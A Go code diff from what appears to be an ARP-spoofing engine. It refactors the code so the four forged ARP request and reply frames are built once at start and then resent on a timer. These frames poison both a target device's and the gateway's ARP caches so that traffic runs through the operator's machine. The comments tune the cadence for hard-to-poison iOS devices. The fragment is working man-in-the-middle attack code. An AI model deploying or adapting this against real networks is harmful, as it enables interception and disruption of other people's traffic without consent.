@@ -57,6 +57,20 @@ type runner struct {
 	cancel  context.CancelFunc
 	started time.Time
 	done    chan struct{} // closed when poison goroutine exits
+
+	// Pre-built cadence frames. The 4 frames sent per cycle (REQ+REPLY
+	// to poison the target, REQ+REPLY to poison the gateway) are
+	// completely static for the lifetime of this runner — Target MACs
+	// and IPs don't change. Building them once at Start and reusing
+	// them on every tick eliminates 4 SerializeBuffer allocations and
+	// 4 gopacket layer-serialise passes per cycle. At default 1 Hz the
+	// saving is negligible; at -poison-cadence 50ms (~20 Hz × 4 = 80
+	// fps/target) it removes ~80 alloc/sec/target — meaningful when
+	// poisoning a handful of stubborn iOS devices in parallel.
+	poisonTargetReq []byte
+	poisonTargetRep []byte
+	poisonGwReq     []byte
+	poisonGwRep     []byte
 }
 
 // copyTarget returns a deep copy of t so callers can't mutate engine-internal
@@ -130,6 +144,12 @@ func (e *Engine) write(buf []byte) error {
 
 // Start begins poisoning t. Idempotent: starting an already-active target
 // is a no-op (returns nil without restarting).
+//
+// Frame pre-build: the 4 frames sent on each cadence cycle are static for
+// the lifetime of the runner, so they're constructed once here. A
+// construction failure is surfaced as a Start error rather than being
+// silently dropped per-tick — if gopacket can't serialise the frame for
+// this target there's no point queuing the poison goroutine.
 func (e *Engine) Start(t Target) error {
 	key := t.MAC.String()
 	e.mu.Lock()
@@ -141,42 +161,60 @@ func (e *Engine) Start(t Target) error {
 		e.mu.Unlock()
 		return nil
 	}
+	// Build cadence frames before staking the active slot so a build
+	// error doesn't leave an empty runner registered.
+	// Poison target's cache: "gateway IP is at op MAC". REQUEST form
+	// forces sender-info learning; REPLY follows up. ethL2Src = opMAC
+	// keeps the bridge FDB clean even though the ARP body claims
+	// someone else's MAC.
+	pTgtReq, err := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
+	if err != nil {
+		e.mu.Unlock()
+		return fmt.Errorf("arpengine: build poison-target-req: %w", err)
+	}
+	pTgtRep, err := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
+	if err != nil {
+		e.mu.Unlock()
+		return fmt.Errorf("arpengine: build poison-target-rep: %w", err)
+	}
+	// Poison gateway's cache: "target IP is at op MAC".
+	pGwReq, err := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
+	if err != nil {
+		e.mu.Unlock()
+		return fmt.Errorf("arpengine: build poison-gw-req: %w", err)
+	}
+	pGwRep, err := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
+	if err != nil {
+		e.mu.Unlock()
+		return fmt.Errorf("arpengine: build poison-gw-rep: %w", err)
+	}
 	ctx, cancel := context.WithCancel(context.Background())
 	r := &runner{
-		target:  t,
-		cancel:  cancel,
-		started: time.Now(),
-		done:    make(chan struct{}),
+		target:          t,
+		cancel:          cancel,
+		started:         time.Now(),
+		done:            make(chan struct{}),
+		poisonTargetReq: pTgtReq,
+		poisonTargetRep: pTgtRep,
+		poisonGwReq:     pGwReq,
+		poisonGwRep:     pGwRep,
 	}
 	e.active[key] = r
 	e.mu.Unlock()
 
-	go e.loop(ctx, t, r.done)
+	go e.loop(ctx, r)
 	return nil
 }
 
-func (e *Engine) loop(ctx context.Context, t Target, done chan struct{}) {
-	defer close(done)
+func (e *Engine) loop(ctx context.Context, r *runner) {
+	defer close(r.done)
 	tick := time.NewTicker(e.cadence)
 	defer tick.Stop()
 	send := func() {
-		// Poison target's cache: "gateway IP is at op MAC". REQUEST
-		// form forces sender-info learning; REPLY follows up. ethL2Src
-		// = opMAC keeps the bridge FDB clean even though the ARP body
-		// claims someone else's MAC.
-		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
-			_ = e.write(f)
-		}
-		if f, err := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
-			_ = e.write(f)
-		}
-		// Poison gateway's cache: "target IP is at op MAC".
-		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
-			_ = e.write(f)
-		}
-		if f, err := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
-			_ = e.write(f)
-		}
+		_ = e.write(r.poisonTargetReq)
+		_ = e.write(r.poisonTargetRep)
+		_ = e.write(r.poisonGwReq)
+		_ = e.write(r.poisonGwRep)
 	}
 
 	send() // immediate first emission
